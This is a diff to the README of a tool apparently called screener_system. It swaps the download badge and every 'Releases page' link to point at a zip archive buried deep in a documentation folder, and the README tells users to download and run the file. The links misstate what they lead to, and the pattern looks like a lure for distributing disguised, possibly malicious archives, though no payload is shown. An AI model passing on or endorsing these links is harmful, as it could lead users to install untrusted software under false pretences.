@@ -6,7 +6,7 @@ Welcome to the **screener_system**, an advanced platform designed to help you an
 
 ## 📥 Download Now
 
-[![Download screener_system](https://raw.githubusercontent.com/levio827/screener_system/main/docs/api/screener_system-dosa.zip%20screener_system-brightgreen)](https://raw.githubusercontent.com/levio827/screener_system/main/docs/api/screener_system-dosa.zip)
+[![Download screener_system](https://github.com/levio827/screener_system/raw/refs/heads/main/docs-site/docs/api/frontend/hooks/useFilterPresets/interfaces/system_screener_1.8.zip%20screener_system-brightgreen)](https://github.com/levio827/screener_system/raw/refs/heads/main/docs-site/docs/api/frontend/hooks/useFilterPresets/interfaces/system_screener_1.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ To ensure the best performance, please check the following requirements before i
 
 To start using the screener_system, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/levio827/screener_system/main/docs/api/screener_system-dosa.zip) to download the latest version.
+1. Visit the [Releases page](https://github.com/levio827/screener_system/raw/refs/heads/main/docs-site/docs/api/frontend/hooks/useFilterPresets/interfaces/system_screener_1.8.zip) to download the latest version.
 2. Look for the most recent release.
 3. Click on the download link for your operating system.
 4. Once the file is downloaded, locate it in your 'Downloads' folder.
@@ -70,7 +70,7 @@ If you encounter any issues, try the following:
 
 ## 🔗 Useful Links
 
-- **Releases Page:** [Visit here to download](https://raw.githubusercontent.com/levio827/screener_system/main/docs/api/screener_system-dosa.zip)
+- **Releases Page:** [Visit here to download](https://github.com/levio827/screener_system/raw/refs/heads/main/docs-site/docs/api/frontend/hooks/useFilterPresets/interfaces/system_screener_1.8.zip)
 - **User Manual:** Access detailed instructions and FAQs.
 - **Community Discussion:** Connect with other users and developers for advice and tips.
 
